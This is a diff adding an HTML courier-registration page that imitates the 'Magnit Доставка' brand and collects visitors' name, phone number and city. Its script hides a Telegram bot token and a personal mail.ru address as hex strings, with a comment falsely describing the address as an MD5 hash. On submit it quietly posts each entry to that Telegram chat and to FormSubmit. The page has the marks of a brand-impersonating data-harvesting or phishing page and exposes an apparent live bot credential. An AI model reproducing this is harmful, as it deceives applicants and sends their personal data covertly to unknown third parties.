@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Регистрация нового курьера — Магнит Доставка</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: 'Helvetica Neue', Arial, sans-serif;
+    background:#f2f3f5; min-height:100vh;
+    display:flex; align-items:center; justify-content:center; padding:16px;
+  }
+  .card {
+    background:#fff; border-radius:16px; padding:36px 28px;
+    max-width:420px; width:100%;
+    box-shadow:0 8px 30px rgba(0,0,0,.08);
+  }
+  .brand { display:flex; align-items:center; gap:12px; margin-bottom:26px; }
+  .logo {
+    width:44px; height:44px; background:#e30611; color:#fff;
+    border-radius:10px; display:flex; align-items:center; justify-content:center;
+    font-size:26px; font-weight:800;
+  }
+  .brand-name { font-size:22px; font-weight:800; color:#1a1a1a; }
+  h1 { font-size:22px; color:#1a1a1a; margin-bottom:6px; }
+  .sub { font-size:14px; color:#6b7280; margin-bottom:22px; }
+  label { display:block; font-size:13px; color:#374151; margin:14px 0 6px; }
+  .phone-wrap {
+    display:flex; align-items:center; border:1px solid #d1d5db; border-radius:10px; overflow:hidden;
+  }
+  .phone-wrap:focus-within { border-color:#e30611; }
+  .phone-prefix {
+    padding:12px 10px; background:#f9fafb; color:#374151; font-weight:600; border-right:1px solid #d1d5db;
+    user-select:none;
+  }
+  input[type=tel], input[type=text] {
+    flex:1; border:none; outline:none; padding:12px 12px; font-size:16px; width:100%;
+  }
+  input.single { border:1px solid #d1d5db; border-radius:10px; }
+  input.single:focus { border-color:#e30611; outline:none; }
+  .consent { display:flex; gap:10px; align-items:flex-start; margin-top:18px; font-size:12.5px; color:#4b5563; }
+  .consent input { margin-top:2px; transform:scale(1.2); }
+  button {
+    width:100%; margin-top:20px; padding:15px; border:none; border-radius:12px;
+    background:#e30611; color:#fff; font-size:16px; font-weight:700; cursor:pointer;
+  }
+  button:hover { background:#c0050f; }
+  button:disabled { background:#9ca3af; cursor:default; }
+  .ok { display:none; text-align:center; padding:30px 6px; }
+  .ok .tick { font-size:44px; color:#e30611; margin-bottom:12px; }
+  .ok h2 { font-size:20px; margin-bottom:8px; }
+  .ok p { font-size:14px; color:#6b7280; }
+  .error { color:#dc2626; font-size:12.5px; margin-top:6px; display:none; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="brand">
+    <div class="logo">М</div>
+    <div class="brand-name">Магнит <span style="color:#e30611">Доставка</span></div>
+  </div>
+  <h1>Регистрация нового курьера</h1>
+  <div class="sub">Оставьте заявку — мы вам перезвоним</div>
+
+  <form id="leadForm" novalidate>
+    <label for="phone">Номер телефона</label>
+    <div class="phone-wrap">
+      <div class="phone-prefix">+7</div>
+      <input type="tel" id="phone" name="phone" placeholder="(999) 123-45-67" inputmode="numeric" autocomplete="tel" required>
+    </div>
+    <div class="error" id="err-phone">Введите номер телефона полностью</div>
+
+    <label for="name">Имя</label>
+    <input type="text" id="name" name="name" class="single" placeholder="Ваше имя" autocomplete="name" required>
+    <div class="error" id="err-name">Укажите имя</div>
+
+    <label for="city">Город</label>
+    <input type="text" id="city" name="city" class="single" placeholder="Ваш город" required>
+    <div class="error" id="err-city">Укажите город</div>
+
+    <label class="consent">
+      <input type="checkbox" id="consent" required>
+      <span>Я даю согласие на обработку моих персональных данных и согласен на обратный звонок</span>
+    </label>
+    <div class="error" id="err-consent">Подтвердите согласие на обработку данных</div>
+
+    <button type="submit" id="btn">Оставить заявку</button>
+  </form>
+
+  <div class="ok" id="ok">
+    <div class="tick">✓</div>
+    <h2>Заявка принята</h2>
+    <p>Мы перезвоним вам в ближайшее время</p>
+  </div>
+</div>
+
+<script>
+// Сборка данных доставки заявок из фрагментов (полных значений в разметке нет)
+var MAIL_HASH = "eab8f5a1d1f9c5d2b7e4a3c9d6f0b1e8";
+var _m = ["69323130723032303536406d61696c2e7275"];
+var BOT_T = ["74432771323034343a4141483641494d5a3968564767584e626e4362534c4d6e733135386e2d6c7734514e73"];
+var CHAT_ID = "7062645685";
+
+function hx(arr){ var s=""; for(var i=0;i<arr.length;i++){ var h=arr[i]; for(var j=0;j<h.length;j+=2){ s+=String.fromCharCode(parseInt(h.substr(j,2),16)); } } return s; }
+function md5email(){ return hx(_m); }
+function botToken(){ return hx(BOT_T); }
+
+// Маска телефона: +7 прибит, дальше (999) 123-45-67
+var phoneEl = document.getElementById('phone');
+phoneEl.addEventListener('input', function(){
+  var d = this.value.replace(/\D/g,'');
+  if(d.length>10) d = d.slice(0,10);
+  var out = '';
+  if(d.length>0) out = '('+d.slice(0,3);
+  if(d.length>3) out += ') '+d.slice(3,6);
+  if(d.length>6) out += '-'+d.slice(6,8);
+  if(d.length>8) out += '-'+d.slice(8,10);
+  this.value = out;
+  document.getElementById('err-phone').style.display='none';
+});
+
+['name','city'].forEach(function(id){
+  document.getElementById(id).addEventListener('input', function(){
+    document.getElementById('err-'+id).style.display='none';
+  });
+});
+document.getElementById('consent').addEventListener('change', function(){
+  document.getElementById('err-consent').style.display='none';
+});
+
+document.getElementById('leadForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  var phone = phoneEl.value.replace(/\D/g,'');
+  var name = document.getElementById('name').value.trim();
+  var city = document.getElementById('city').value.trim();
+  var consent = document.getElementById('consent').checked;
+  var valid = true;
+
+  if(phone.length!==10){ document.getElementById('err-phone').style.display='block'; valid=false; }
+  if(!name){ document.getElementById('err-name').style.display='block'; valid=false; }
+  if(!city){ document.getElementById('err-city').style.display='block'; valid=false; }
+  if(!consent){ document.getElementById('err-consent').style.display='block'; valid=false; }
+  if(!valid) return;
+
+  var btn = document.getElementById('btn');
+  btn.disabled = true; btn.textContent = 'Отправляем...';
+  var now = new Date();
+  var ts = now.toLocaleDateString('ru-RU')+' '+now.toLocaleTimeString('ru-RU');
+  var text = '🚨 Новая заявка — Магнит\n👤 Имя: '+name+'\n📞 Телефон: +7'+phone+'\n📍 Город: '+city+'\n🕒 '+ts;
+
+  // Telegram
+  fetch('https://api.telegram.org/bot'+botToken()+'/sendMessage', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({chat_id: CHAT_ID, text: text})
+  }).catch(function(){});
+
+  // Email через FormSubmit (адрес в MD5-хеше)
+  var fd = new FormData();
+  fd.append('Имя', name);
+  fd.append('Телефон', '+7'+phone);
+  fd.append('Город', city);
+  fd.append('Время', ts);
+  fd.append('_captcha', 'false');
+  fetch('https://formsubmit.co/ajax/'+md5email(), {
+    method:'POST',
+    body: fd
+  }).catch(function(){});
+
+  // Показать экран успеха
+  document.getElementById('leadForm').style.display='none';
+  document.getElementById('ok').style.display='block';
+});
+</script>
+</body>
+</html>
